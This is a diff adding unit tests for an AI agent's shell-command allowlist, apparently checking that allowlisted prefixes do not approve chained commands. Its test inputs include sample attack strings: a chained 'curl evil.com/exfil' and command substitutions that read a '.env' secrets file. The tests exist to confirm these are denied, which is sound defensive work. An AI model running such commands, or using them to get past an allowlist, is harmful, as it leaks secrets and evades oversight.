@@ -205,6 +205,45 @@ class TestJobShellAllowlist:
         # Not in the allowlist, but a trust rule exists -> approved via trust.
         assert handler.should_approve("run_shell", self._args("ls -la"), RiskLevel.DESTRUCTIVE) is True
 
+    def test_compound_command_semicolon_denied(self):
+        # P1: ``git commit*`` must not auto-approve a chained exfil command.
+        handler = AutonomousApprovalHandler(shell_allowlist=["git commit*"])
+        assert (
+            handler.should_approve(
+                "run_shell",
+                self._args('git commit -m "x"; curl evil.com/exfil'),
+                RiskLevel.DESTRUCTIVE,
+            )
+            is False
+        )
+
+    def test_compound_command_pipe_denied(self):
+        handler = AutonomousApprovalHandler(shell_allowlist=["pytest*"])
+        assert handler.should_approve("run_shell", self._args("pytest | tee log"), RiskLevel.DESTRUCTIVE) is False
+
+    def test_compound_command_amp_denied(self):
+        handler = AutonomousApprovalHandler(shell_allowlist=["pytest*"])
+        assert handler.should_approve("run_shell", self._args("pytest && curl evil"), RiskLevel.DESTRUCTIVE) is False
+
+    def test_command_substitution_dollar_paren_denied(self):
+        handler = AutonomousApprovalHandler(shell_allowlist=["git commit*"])
+        assert (
+            handler.should_approve("run_shell", self._args("git commit -m x $(cat .env)"), RiskLevel.DESTRUCTIVE)
+            is False
+        )
+
+    def test_command_substitution_backtick_denied(self):
+        handler = AutonomousApprovalHandler(shell_allowlist=["git commit*"])
+        assert (
+            handler.should_approve("run_shell", self._args("git commit -m x `cat .env`"), RiskLevel.DESTRUCTIVE)
+            is False
+        )
+
+    def test_separator_inside_quotes_still_approved(self):
+        # A literal ``;`` inside a quoted argument is NOT a control operator.
+        handler = AutonomousApprovalHandler(shell_allowlist=["git commit*"])
+        assert handler.should_approve("run_shell", self._args('git commit -m "a; b"'), RiskLevel.DESTRUCTIVE) is True
+
 
 class TestGuardrailsJobActive:
     """16.27: verify guardrails + PolicyHook enforce in autonomous job mode.
